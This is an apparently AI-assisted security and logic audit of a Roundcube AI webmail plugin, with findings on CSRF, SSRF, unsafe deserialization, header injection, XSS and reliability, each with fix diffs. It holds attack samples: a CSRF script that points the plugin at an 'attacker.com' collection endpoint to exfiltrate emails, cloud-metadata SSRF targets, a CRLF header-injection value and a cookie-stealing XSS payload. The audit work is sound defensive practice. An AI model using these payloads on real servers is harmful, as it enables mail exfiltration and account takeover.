# Roundcube AI (GenIA) — Comprehensive Application Audit & Optimization Report

**Audit Date:** September 2026  
**Auditor Roles:** Principal Software Architect, Senior Security Engineer, Domain Mathematician  
**Workspace:** `webdotpulse/roundcube-AI`  
**Primary Artifacts Evaluated:** [`lifeprisma_ai.php`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php), [`src/lifeprisma_ai.js`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js), [`config.inc.php.dist`](file:///home/koen/Git/roundcube-AI/config.inc.php.dist), [`skins/elastic/style.css`](file:///home/koen/Git/roundcube-AI/skins/elastic/style.css)

---

## 1. Executive Summary & Health Score

This comprehensive audit evaluates the Roundcube AI (GenIA) integration across mathematical correctness, architectural resilience, OWASP/CWE security posture, and code maintainability.

### Codebase Health Scores (Scale 1–10)

| Dimension | Score | Assessment | Primary Hazard |
| :--- | :---: | :--- | :--- |
| **Logic & Mathematical Integrity** | **6.5 / 10** | Tally calculations for spam scores exhibit sign inversion bugs; token pricing logic fails on free-tier ($0) models and suffers IEEE-754 floating-point rounding errors; rate-limiting relies on a delta check rather than an aggregate rate window. | Negative spam tally masked; token price reporting outputs `$NaN` or truncates micro-costs; rate limiter bypassable over time. |
| **Architecture & Deficiencies** | **4.5 / 10** | Synchronous cURL calls hold Roundcube PHP session locks for up to 120 seconds; global configuration hijacks the Roundcube `users` table with a dummy entity; cache deduplication lacks offline fallback when Redis is absent. | Complete webmail UI lockup during AI generation; SQLite syntax crash on `now()`; runaway draft duplication if Redis is inactive. |
| **Security, Validation & Hardening** | **3.0 / 10** | Universal absence of CSRF token verification across all plugin action endpoints; unrestricted Blind SSRF to internal networks/cloud metadata via unvalidated `api_url`; PHP Object Injection hazards via `unserialize()`; unescaped DOM XSS injection vectors; Email Header Injection in draft creation. | Remote CSRF admin configuration overwrite; AWS/GCP metadata extraction via SSRF; RCE via deserialization gadget chains; IMAP header tampering. |
| **Operational Reliability** | **5.0 / 10** | Missing type checks cause fatal PHP 8 TypeError crashes on IMAP search result sets; SSE stream buffers can accumulate arbitrarily large non-SSE payloads without memory bounds; cURL stream fails to terminate on error response. | Worker thread memory exhaustion; daemon process hang; silent background failures. |

### Primary Risk Areas Requiring Immediate Remediation
1. **Critical Authentication & Integrity Bypass (CSRF):** While the frontend JavaScript faithfully sends Roundcube's CSRF token `_token`, the backend PHP controller never executes `$rcmail->check_request_token()`. Malicious websites visited by an authenticated Roundcube user can execute requests, modify provider API keys, flush templates, and drain LLM budgets.
2. **Blind SSRF via Custom Endpoints:** Administrators or attackers (via CSRF) can configure arbitrary API endpoints (e.g. `http://169.254.169.254/latest/meta-data/` or `http://127.0.0.1:6379`). The backend executes raw HTTP POST requests via cURL without restricting IP ranges, hostnames, or protocols.
3. **Session Lock Denial-of-Service:** In non-streaming requests ([`handle_request()`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1175) and [`handle_autodraft()`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1834)), synchronous cURL execution (timeouts up to 120s) occurs before calling `session_write_close()`. During long model reasoning, the user's entire Roundcube webmail session is blocked across all tabs.
4. **IMAP Search Result Type Crash in `handle_new_messages`:** `rcube_storage::search()` returns an `rcube_result_set` instance. Passing this object directly into `array_reverse()` results in a fatal `TypeError` in PHP 8.0+.

---

## 2. Logic & Mathematical Verification

### Issue 2.1: Asymmetric Sign Inversion in Spamd-Bar Parser
- **Location:** [`lifeprisma_ai.php:1454-1462`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1454-L1462)
- **Observed Formula/Logic:**
  ```php
  $plus = substr_count($bar, '+');
  $minus = substr_count($bar, '-');
  $spam_score = $plus > 0 ? (float) $plus : -1.0 * $minus;
  ```
- **Mathematical Analysis:**
  In SpamAssassin / Rspamd, `X-Spamd-Bar` represents score magnitude where each `+` represents $+1.0$ and each `-` represents $-1.0$.
  When a header contains mixed characters or neutral scores (e.g., `+--` where net score is $1 - 2 = -1.0$):
  - Under the current ternary logic: If `$plus > 0`, the expression evaluates strictly to `(float) $plus`, completely discarding the negative tally `$minus`. Thus, a message with two negative points and one positive point is classified as $+1.0$ (Spam) instead of $-1.0$ (Ham).
  - When `$plus == 0` and `$minus == 0` (e.g., whitespace or neutral header), the calculation computes `-1.0 * 0 = -0.0` (IEEE 754 negative zero), polluting serialization and downstream comparisons.
- **Corrected Formulation:**
  $$\text{Score} = \begin{cases} \text{Float}(\text{Match}[1]), & \text{if Header matches } \texttt{score=(-?[0-9]+(?:\.[0-9]+)?)} \\ (\text{Count}(+) - \text{Count}(-)) \times 1.0, & \text{if } \text{Count}(+) + \text{Count}(-) > 0 \\ \text{null}, & \text{otherwise} \end{cases}$$
- **Remediation Diff:**
  ```diff
  --- a/lifeprisma_ai.php
  +++ b/lifeprisma_ai.php
  @@ -1447,18 +1447,21 @@ class lifeprisma_ai extends rcube_plugin
               $spam_score = null;
               $spam_header = $msg->headers->others['x-spam-status'] ?? '';
               if (is_array($spam_header)) $spam_header = end($spam_header);
  -            if ($spam_header && preg_match('/\bscore=(-?[0-9.]+)/i', $spam_header, $m)) {
  +            if ($spam_header && preg_match('/\bscore=(-?[0-9]+(?:\.[0-9]+)?)/i', $spam_header, $m)) {
                   $spam_score = (float) $m[1];
               }
               // Fallback: X-Spamd-Bar (+ = positive, - = negative)
               if ($spam_score === null) {
                   $bar = $msg->headers->others['x-spamd-bar'] ?? '';
                   if (is_array($bar)) $bar = end($bar);
                   if ($bar) {
                       $plus = substr_count($bar, '+');
                       $minus = substr_count($bar, '-');
  -                    $spam_score = $plus > 0 ? (float) $plus : -1.0 * $minus;
  +                    if ($plus > 0 || $minus > 0) {
  +                        $spam_score = (float) ($plus - $minus);
  +                    }
                   }
               }
  ```

---

### Issue 2.2: Floating-Point Falsy Zero Bug & IEEE-754 Truncation in Token Pricing
- **Location:** [`src/lifeprisma_ai.js:2203-2223`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L2203-L2223)
- **Observed Formula/Logic:**
  ```javascript
  var mp = pricing[model];
  if (mp && mp.input && mp.output) {
      rates = [mp.input, mp.output];
      break;
  }
  // ...
  var cost = (inputTokens * rates[0] + outputTokens * rates[1]) / 1000000;
  if (cost < 0.0001) return '$' + cost.toFixed(6);
  return '$' + cost.toFixed(4);
  ```
- **Mathematical & Logic Analysis:**
  1. **Falsy Zero Rejection:** In JavaScript, `0` evaluates to `false`. When a provider configures a free model or tier (e.g. Gemini free tier or local Ollama instances where `input: 0`, `output: 0`), `mp.input && mp.output` evaluates to `0 && 0 => false`. As a result, the code ignores the explicit $0.00 pricing tier and falls back to hardcoded dictionaries or returns `null`.
  2. **Missing Gemini Fallback Rates:** The fallback table [`lpai_pricing`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L2188) omitted `gemini-3.6-flash` and `gemini-2.5-flash`. When dynamic pricing is uninitialized, cost calculations return `null`.
  3. **Unsanitized Numerical Operands:** If tokens arrive as `undefined` or null objects, arithmetic evaluates to `NaN`, rendering `"$NaN"` directly into the user interface.
  4. **Floating-Point Representation Errors:** Direct evaluation of `(150 * 0.30 + 50 * 2.50) / 1000000` produces `0.00017000000000000002`. Fixed decimal formatting requires bounded rounding to prevent precision artifacts.
- **Remediation Code:**
  ```diff
  --- a/src/lifeprisma_ai.js
  +++ b/src/lifeprisma_ai.js
  @@ -2198,24 +2198,31 @@ var lpai_pricing = {
       'claude-sonnet-4-6':        [3.00, 15.00],
       'claude-haiku-4-5-20251001': [0.80, 4.00],
       'claude-opus-4-6':  [15.00, 75.00],
  +    'gemini-3.6-flash': [0.30, 2.50],
  +    'gemini-2.5-flash': [0.30, 2.50],
   };
   
   function lpai_estimate_cost(model, inputTokens, outputTokens) {
  +    var inCount = Number(inputTokens) || 0;
  +    var outCount = Number(outputTokens) || 0;
  +    if (inCount === 0 && outCount === 0) return null;
  +
       var rates = null;
       var providers = rcmail.env.lpai_providers || {};
       var pids = Object.keys(providers);
       for (var i = 0; i < pids.length; i++) {
           var p = providers[pids[i]];
           var pricing = p.pricing || {};
           var mp = pricing[model];
  -        if (mp && mp.input && mp.output) {
  -            rates = [mp.input, mp.output];
  +        if (mp && typeof mp.input !== 'undefined' && typeof mp.output !== 'undefined') {
  +            rates = [Number(mp.input) || 0, Number(mp.output) || 0];
               break;
           }
       }
       if (!rates) rates = lpai_pricing[model];
       if (!rates) return null;
  -    var cost = (inputTokens * rates[0] + outputTokens * rates[1]) / 1000000;
  +    var cost = ((inCount * rates[0]) + (outCount * rates[1])) / 1000000;
  +    if (cost === 0) return '$0.00';
       if (cost < 0.0001) return '$' + cost.toFixed(6);
       return '$' + cost.toFixed(4);
   }
  ```

---

### Issue 2.3: Array Detection Flaw in Unsupported Parameter Filtering
- **Location:** [`lifeprisma_ai.php:446-456`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L446-L456)
- **Observed Formula/Logic:**
  ```php
  private function get_unsupported_params($provider, $model)
  {
      $raw = $provider['unsupported_params'] ?? [];
      if (empty($raw)) return [];
      if (is_array($raw) && !isset($raw[0])) {
          return $raw[$model] ?? [];
      }
      return $raw;
  }
  ```
- **Mathematical & Logic Analysis:**
  The logic attempts to discriminate between a flat string array `['temperature', 'reasoning_none']` and an associative map `{'model-id': ['temperature']}` using the heuristic `!isset($raw[0])`.
  - In PHP, string keys that represent valid integers (e.g. `"0"`) are automatically cast to integer keys by the Zend Engine. If a custom or fine-tuned model identifier is named `"0"` or numeric string `"100"`, `isset($raw[0])` evaluates to `true`.
  - The method treats the dictionary as a sequential array and returns the entire nested map: `["0" => ["temperature"]]`.
  - Downstream callers execute `in_array('temperature', $unsupported)`. Because `$unsupported` contains a nested array rather than scalar strings, `in_array()` returns `false`, causing the engine to transmit prohibited parameters to APIs that immediately reject the request with HTTP 400.
- **Corrected Formulation:**
  Use strict list validation via `array_is_list()` (PHP 8.1+) or key inspection to verify sequential index alignment:
  $$\text{is\_sequential}(A) \iff \text{keys}(A) == [0, 1, \dots, |A|-1]$$
- **Remediation Diff:**
  ```diff
  --- a/lifeprisma_ai.php
  +++ b/lifeprisma_ai.php
  @@ -448,8 +448,11 @@ class lifeprisma_ai extends rcube_plugin
           $raw = $provider['unsupported_params'] ?? [];
           if (empty($raw)) return [];
  -        // Per-model map: { "gpt-5-nano": ["temperature", "reasoning_none"] }
  -        if (is_array($raw) && !isset($raw[0])) {
  +        // Per-model map: associative dictionary keyed by model string
  +        $is_list = function_exists('array_is_list') 
  +            ? array_is_list($raw) 
  +            : (array_keys($raw) === range(0, count($raw) - 1));
  +        if (is_array($raw) && !$is_list) {
               return $raw[$model] ?? [];
           }
           // Legacy flat array: ["temperature", "reasoning_none"] — applies to all models
  ```

---

### Issue 2.4: Rate Limiting: Consecutive Cooldown vs. Sliding Window Quota
- **Location:** [`lifeprisma_ai.php:749-765`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L749-L765)
- **Observed Formula/Logic:**
  ```php
  $last = $_SESSION[$session_key] ?? 0;
  $now = microtime(true);
  if ($now - $last < $cooldown) {
      return false;
  }
  $_SESSION[$session_key] = $now;
  ```
- **Mathematical & Logic Analysis:**
  The implementation tests an instantaneous inter-arrival time $\Delta t = t_k - t_{k-1} < \tau$.
  - **Sustained Drain Vulnerability:** An automated script issuing 1 request every $3.01$ seconds satisfies $\Delta t \ge 3.0$, generating $1,196$ calls per hour per user. Over an 8-hour workday, a single compromised or abusive mailbox can consume over $9,500$ generation calls, costing upwards of hundreds of dollars in LLM API fees.
  - **Absence of Token Bucket / Sliding Window:** Rate limiting requires enforcing both a burst cooldown $\Delta t \ge \tau$ and an aggregate volume quota:
    $$\sum_{i=1}^{N} \mathbb{I}(t - t_i \le W) \le Q_{\max}$$
    where $W = 3600\text{s}$ and $Q_{\max} = 60\text{ requests}$.

---

## 3. Bugs, Vulnerabilities & Edge-Case Vulnerabilities

### Severity Breakdown:
- **Critical:** 2
- **High:** 4
- **Medium:** 3
- **Low:** 2

---

### [CRITICAL] Issue 3.1: Universal Absence of CSRF Token Verification on Action Endpoints
- **CWE:** [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)
- **Affected Endpoints & Files:**
  - [`lifeprisma_ai.php:526`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L526) (`handle_admin_save`)
  - [`lifeprisma_ai.php:815`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L815) (`handle_stream`)
  - [`lifeprisma_ai.php:1175`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1175) (`handle_request`)
  - [`lifeprisma_ai.php:686`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L686) (`handle_templates`)
  - [`lifeprisma_ai.php:1834`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1834) (`handle_autodraft`)
- **Reproduction Scenario:**
  1. An authenticated Roundcube administrator visits an external website containing:
     ```html
     <script>
     fetch('https://mail.victim-corp.com/?_task=settings&_action=plugin.lifeprisma_ai_admin_save', {
         method: 'POST',
         credentials: 'include',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
             providers: {
                 'exfil': {
                     api_url: 'https://attacker.com/collect',
                     api_key: 'attacker_key',
                     model: 'exfil'
                 }
             },
             settings: { default_provider: 'exfil' }
         })
     });
     </script>
     ```
  2. Because Roundcube session cookies are submitted automatically and the backend never calls `$rcmail->check_request_token()`, the configuration is overwritten. All future internal emails processed by GenIA are exfiltrated to `attacker.com`.
- **Root Cause:**
  `rcube_plugin` actions do not enforce CSRF protection by default; plugins must invoke `$rcmail->check_request_token()` on state-changing or authenticated actions.
- **Remediation Patch:**
  ```diff
  --- a/lifeprisma_ai.php
  +++ b/lifeprisma_ai.php
  @@ -528,6 +528,12 @@ class lifeprisma_ai extends rcube_plugin
           if (!$this->is_admin()) {
               header('Content-Type: application/json');
               echo json_encode(['status' => 'error', 'message' => 'Access denied']);
               exit;
           }
  +        $rcmail = rcmail::get_instance();
  +        if (!$rcmail->check_request_token(rcube_utils::INPUT_POST)) {
  +            header('Content-Type: application/json', true, 403);
  +            echo json_encode(['status' => 'error', 'message' => 'Invalid CSRF token']);
  +            exit;
  +        }
  ```

---

### [CRITICAL] Issue 3.2: Blind Server-Side Request Forgery (SSRF) & Intranet Exposure
- **CWE:** [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- **Affected Files:**
  - [`lifeprisma_ai.php:1007-1031`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1007-L1031) (`handle_stream`)
  - [`lifeprisma_ai.php:1328-1336`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1328-L1336) (`handle_request`)
  - [`lifeprisma_ai.php:2057-2065`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2057-L2065) (`call_ai_direct`)
- **Vulnerability Flow:**
  - The administrator or an attacker (via CSRF) configures `api_url` to `http://169.254.169.254/latest/meta-data/` or `http://10.0.0.5:8080/internal-api`.
  - cURL initializes `$ch = curl_init($api_url)`.
  - `CURLOPT_PROTOCOLS_ALLOWED` is unset, allowing non-HTTP schemes (e.g. `gopher://`, `file://`).
  - No IP address filter validates whether the resolved IP falls in RFC 1918 private subnets, localhost (`127.0.0.1`), or link-local ranges (`169.254.0.0/16`).
- **Remediation Patch:**
  Add URL validation and sanitize URLs prior to issuing cURL requests:
  ```php
  private function validate_api_url($url, $allow_local = false)
  {
      $parts = parse_url($url);
      if (!$parts || !in_array(strtolower($parts['scheme'] ?? ''), ['http', 'https'])) {
          return false;
      }
      $host = $parts['host'] ?? '';
      if (empty($host)) return false;

      if ($allow_local && ($host === 'localhost' || $host === '127.0.0.1')) {
          return true;
      }

      $ips = dns_get_record($host, DNS_A + DNS_AAAA);
      if (empty($ips)) {
          $ip = gethostbyname($host);
          $ips = [['ip' => $ip]];
      }

      foreach ($ips as $record) {
          $target_ip = $record['ip'] ?? ($record['ipv6'] ?? '');
          if (filter_var($target_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
              return false; // Blocks 127.0.0.1, 10.x, 192.168.x, 169.254.x
          }
      }
      return true;
  }
  ```

---

### [HIGH] Issue 3.3: Insecure Deserialization via Unfiltered `unserialize()` (CWE-502)
- **CWE:** [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- **Affected Files:**
  - [`lifeprisma_ai.php:589`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L589) (`get_admin_config`)
  - [`lifeprisma_ai.php:651`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L651) (`get_user_usage`)
- **Vulnerability Mechanics:**
  `unserialize($row['preferences'])` executes with PHP's default behavior, which permits class instantiation. In environments utilizing libraries such as Guzzle, Monolog, or PEAR (all standard in Roundcube ecosystems), arbitrary POP (Property-Oriented Programming) gadget chains can be triggered if the database row is modified.
- **Remediation Patch:**
  ```diff
  --- a/lifeprisma_ai.php
  +++ b/lifeprisma_ai.php
  @@ -586,7 +586,7 @@ class lifeprisma_ai extends rcube_plugin
           $result = $db->query("SELECT preferences FROM users WHERE username = ?", '__genia_admin__');
           $row = $db->fetch_assoc($result);
           if ($row && !empty($row['preferences'])) {
  -            $data = unserialize($row['preferences']);
  +            $data = unserialize($row['preferences'], ['allowed_classes' => false]);
               return $data['genia_admin'] ?? [];
           }
           return [];
  @@ -648,7 +648,7 @@ class lifeprisma_ai extends rcube_plugin
           $users = [];
           while ($row = $db->fetch_assoc($result)) {
  -            $prefs = unserialize($row['preferences']);
  +            $prefs = unserialize($row['preferences'], ['allowed_classes' => false]);
               $users[] = [
  ```

---

### [HIGH] Issue 3.4: Email Header Injection in Automated IMAP Draft Generation (CWE-93)
- **CWE:** [CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')](https://cwe.mitre.org/data/definitions/93.html)
- **Affected File:** [`lifeprisma_ai.php:2134-2152`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2134-L2152) (`create_imap_draft`)
- **Vulnerability Mechanics:**
  ```php
  $headers = [
      'Date: ' . date('r'),
      'From: ' . $from_str,
      'To: ' . $to,
      'Subject: ' . $re_subject,
      // ...
  ];
  $raw_message = implode("\r\n", $headers) . "\r\n\r\n" . $full_body;
  ```
  `$to` and `$subject` are derived from incoming untrusted emails. If an incoming message contains CRLF characters in the `From` or `Subject` header (e.g., `From: sender@domain.com\r\nBcc: victim@domain.com\r\nX-Injected: true`), the raw string concatenation injects arbitrary RFC 822 headers or splits the MIME message boundary.
  Furthermore, non-ASCII characters in subjects (e.g. accented letters, Cyrillic, Chinese, emojis) are written without RFC 2047 MIME header encoding (`=?UTF-8?B?...?=`), corrupting IMAP headers.
- **Remediation Patch:**
  ```diff
  --- a/lifeprisma_ai.php
  +++ b/lifeprisma_ai.php
  @@ -2134,8 +2134,11 @@ class lifeprisma_ai extends rcube_plugin
  +            // Sanitize CRLF to prevent RFC822 Header Injection
  +            $clean_to = preg_replace('/[\r\n]+/', ' ', trim($to));
  +            $clean_subject = preg_replace('/[\r\n]+/', ' ', trim($re_subject));
  +            $encoded_subject = rcube_mime::encode_header('Subject', $clean_subject);
               $headers = [
                   'Date: ' . date('r'),
                   'From: ' . $from_str,
  -                'To: ' . $to,
  -                'Subject: ' . $re_subject,
  +                'To: ' . $clean_to,
  +                $encoded_subject,
                   'Message-ID: ' . $msg_id,
  ```

---

### [HIGH] Issue 3.5: DOM XSS via Unescaped API/Error Payloads & Admin Form Fields
- **CWE:** [CWE-79: Cross-Site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)
- **Affected File:** [`src/lifeprisma_ai.js:877, 887, 2482-2538`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L877)
- **Vulnerability Mechanics:**
  1. [`src/lifeprisma_ai.js:877`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L877):
     ```javascript
     targetEl.innerHTML = '<span style="color:#ef4444">Error: ' + (event.message || 'Unknown') + '</span>';
     ```
     `event.message` originating from remote API servers or SSE payloads is written directly into `targetEl.innerHTML` without sanitization. An adversarial or compromised LLM endpoint returning HTML/JavaScript executes immediately in the client context.
  2. [`src/lifeprisma_ai.js:2489-2530`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L2489-L2530):
     Admin modal fields interpolate `p.label`, `pid`, `p.api_url`, and model names directly into HTML attribute strings:
     ```javascript
     html += '<input type="text" class="lpai-admin-input lpai-admin-label" value="' + (p.label || '') + '">';
     ```
     An attacker controlling provider labels (via config import or CSRF) can inject `"><script>alert(document.cookie)</script>`.
- **Remediation Patch:**
  Add a robust HTML entity encoder in JavaScript and replace direct concatenation:
  ```javascript
  function lpai_escape_html(str) {
      if (str === null || str === undefined) return '';
      return String(str)
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#039;');
  }
  ```

---

### [MEDIUM] Issue 3.6: Fatal Runtime TypeError in `handle_new_messages`
- **CWE:** [CWE-248: Uncaught Exception](https://cwe.mitre.org/data/definitions/248.html)
- **Affected File:** [`lifeprisma_ai.php:1802-1812`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1802-L1812)
- **Failure Mode:**
  In Roundcube, `$storage->search($mbox, 'UNSEEN RECENT')` returns an instance of `rcube_result_set`.
  ```php
  $uids = $storage->search($mbox, 'UNSEEN RECENT');
  // ...
  $uids = array_slice(array_reverse($uids), 0, 2);
  ```
  In PHP 8.0+, passing an object to `array_reverse()` triggers a fatal runtime error:
  `Fatal error: Uncaught TypeError: array_reverse(): Argument #1 ($array) must be of type array, rcube_result_set given`.
  This terminates the Roundcube session poll and prevents all subsequent hooks from executing.
- **Remediation Patch:**
  ```diff
  --- a/lifeprisma_ai.php
  +++ b/lifeprisma_ai.php
  @@ -1802,6 +1802,12 @@ class lifeprisma_ai extends rcube_plugin
           $uids = $storage->search($mbox, 'UNSEEN RECENT');
           if (empty($uids)) {
               $uids = $storage->search($mbox, 'UNSEEN');
           }
  +        if (is_object($uids) && method_exists($uids, 'get')) {
  +            $uids = $uids->get();
  +        }
  +        if (!is_array($uids) || empty($uids)) {
  +            return;
  +        }
  ```

---

### [MEDIUM] Issue 3.7: SSE Infinite Stream Accumulation on API Error
- **CWE:** [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)
- **Affected File:** [`lifeprisma_ai.php:1034-1051`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1034-L1051)
- **Failure Mode:**
  In `CURLOPT_WRITEFUNCTION`:
  ```php
  if ($stream_first_chunk) {
      $stream_first_chunk = false;
      // ...
      if (isset($err['error'])) {
          echo "data: " . json_encode(['type' => 'error', 'message' => $msg]) . "\n\n";
          flush();
          return strlen($data); // <--- ERROR
      }
  }
  ```
  Returning `strlen($data)` signals to cURL that the callback successfully accepted the data and should continue downloading. When an upstream provider returns a massive HTML 502 error gateway page or unformatted error trace, cURL continues reading chunks, appending to `$stream_buffer`, and finally prints `echo "data: [DONE]\n\n";` at line 1167 as if the operation completed normally.
- **Remediation Patch:**
  Return `0` to abort the cURL transfer immediately upon encountering a fatal API error.

---

### [LOW] Issue 3.8: Unbounded Growth in User Template Preferences
- **CWE:** [CWE-770: Allocation of Resources Without Limits or Throttling](https://cwe.mitre.org/data/definitions/770.html)
- **Affected File:** [`lifeprisma_ai.php:700-720`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L700-L720) (`handle_templates`)
- **Failure Mode:**
  The `save` operation appends templates to `genia_templates` without checking count or size limits:
  `$templates[] = ['id' => uniqid('tpl_'), 'name' => $name, 'action' => $action, 'instruction' => $instruction];`
  Users can submit thousands of templates or multi-megabyte instruction payloads, exceeding database column storage sizes for `preferences` (often `TEXT` or `VARCHAR`).
- **Remediation:** Enforce a maximum of 50 templates per user and a 2,000-character ceiling per template instruction.

---

## 4. Architecture, Performance & Resilience Gaps

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          CURRENT ARCHITECTURE GAPS                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Client Request ──► [Roundcube PHP]                                        │
│                            │                                                │
│              Holds Session Lock (Up to 120s)                                │
│                            │                                                │
│                            ▼                                                │
│                  [Synchronous cURL] ──────► [LLM API Provider]              │
│                            │                         │                      │
│                   Blocks Webmail UI             60-120s Wait                │
│                                                                             │
│   Admin Stats ──────► [Full Table Scan]                                     │
│                            │                                                │
│                 SELECT * WHERE LIKE '%genia_%'                              │
│                            │                                                │
│                 Unindexed 500k User Records                                 │
│                                                                             │
│   Global Settings ──► [users Table Hijack]                                  │
│                            │                                                │
│                 Fake User '__genia_admin__'                                 │
│                 SQLite Incompatible (now())                                 │
│                                                                             │
│   Cache State ─────► [Redis-Only Dependency]                                │
│                            │                                                │
│                 Redis absent? Return null ──► Duplicate Drafts Every Poll   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Gap 4.1: Session Lock Contention During Synchronous Generation
- **Root Cause:** PHP's standard session handler locks the session file (`sess_<id>`) on `session_start()` and holds it until script completion unless explicitly released via `session_write_close()`.
- **Bottleneck:** In [`handle_request()`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1175) and [`handle_autodraft()`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1834), cURL is invoked synchronously with timeouts of 60 to 120 seconds. Because `session_write_close()` is never called, any subsequent webmail action (checking mail, opening a folder, browsing messages) hangs indefinitely until the cURL request completes.
- **Remediation:** Invoke `session_write_close()` immediately after validating the request and reading preferences.

---

### Gap 4.2: Architectural Anti-Pattern: Injecting Dummy User `__genia_admin__` into `users` Table
- **Location:** [`lifeprisma_ai.php:582-611`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L582-L611)
- **Flaw:**
  1. Roundcube's `users` table is intended strictly for authenticating email identities. Storing system configuration inside a dummy user `'__genia_admin__'` violates database normalization.
  2. Line 608 uses MySQL-specific syntax: `VALUES (?, ?, ?, now())`. Roundcube supports SQLite and PostgreSQL; in SQLite, `now()` throws a fatal query error (`no such function: now`).
  3. Administrative queries require negative filtering (`WHERE username != '__genia_admin__'`) to prevent metrics contamination.
- **Remediation:**
  Use Roundcube's native system configuration system (`config.inc.php`) or store plugin options in the Roundcube `system` table if persistent runtime updates are required:
  ```php
  $db = $rcmail->get_dbh();
  $now_expr = $db->now(); // Cross-database compatible SQL expression
  ```

---

### Gap 4.3: Unindexed Table Scans in Admin Dashboard
- **Location:** [`lifeprisma_ai.php:628-659`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L628-L659)
- **Flaw:**
  ```sql
  SELECT COUNT(*) as active_users FROM users WHERE username != '__genia_admin__' AND preferences LIKE '%genia_%'
  ```
  In enterprise deployments with 50,000+ mail accounts, searching serialized data with leading wildcards (`LIKE '%genia_%'`) forces a full sequential scan of large `TEXT`/`LONGTEXT` columns on every admin dashboard render, saturating database I/O.
- **Remediation:** Maintain a lightweight summary table or cache the metric in Redis/file cache with a 1-hour TTL.

---

### Gap 4.4: Runaway Draft Duplication When Redis is Absent
- **Location:** [`lifeprisma_ai.php:791-810, 1868-1877`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L791-L810)
- **Flaw:**
  The deduplication check in `should_auto_draft()` relies entirely on `$this->cache_get($cache_key)`.
  If Redis is not installed (which is typical on basic Roundcube installs), `redis_connect()` returns `false`, and `cache_get()` returns `null` on every invocation.
  Consequently, every incoming mail check or read view re-evaluates the same message as unprocessed, spawning duplicate draft replies on every page refresh.
- **Remediation:** Implement an automatic fallback to user preferences (`genia_autodraft_log`) or local file-based cache when Redis is unavailable.

---

## 5. Prioritized Action Matrix

| Priority | Category | File / Component | Effort | Expected Impact |
| :---: | :--- | :--- | :---: | :--- |
| **P0** | **Security** | [`lifeprisma_ai.php:526, 815, 1175, 1834`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php) | **Low** (1h) | Eliminates critical CSRF vulnerability across all plugin endpoints. |
| **P0** | **Security** | [`lifeprisma_ai.php:1025, 1329, 2058`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php) | **Medium** (2h) | Prevents Blind SSRF and unauthorized intranet / metadata exploration. |
| **P0** | **Reliability** | [`lifeprisma_ai.php:1802-1812`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1802-L1812) | **Low** (30m) | Fixes fatal PHP 8 `TypeError` when handling IMAP search results. |
| **P1** | **Performance** | [`lifeprisma_ai.php:1175, 1834`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1175) | **Low** (30m) | Resolves session lockup blocking webmail navigation during AI generation. |
| **P1** | **Security** | [`lifeprisma_ai.php:2134-2152`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2134-L2152) | **Low** (1h) | Blocks CRLF Email Header Injection in auto-draft generation. |
| **P1** | **Security** | [`lifeprisma_ai.php:589, 651`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L589) | **Low** (30m) | Hardens `unserialize()` against PHP Object Injection (CWE-502). |
| **P1** | **Security** | [`src/lifeprisma_ai.js:877, 2489`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L877) | **Medium** (2h) | Sanitizes dynamic DOM strings to eliminate XSS (CWE-79). |
| **P2** | **Mathematics** | [`lifeprisma_ai.php:1454-1462`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1454-L1462) | **Low** (30m) | Corrects sign calculation for Spamd bar scores. |
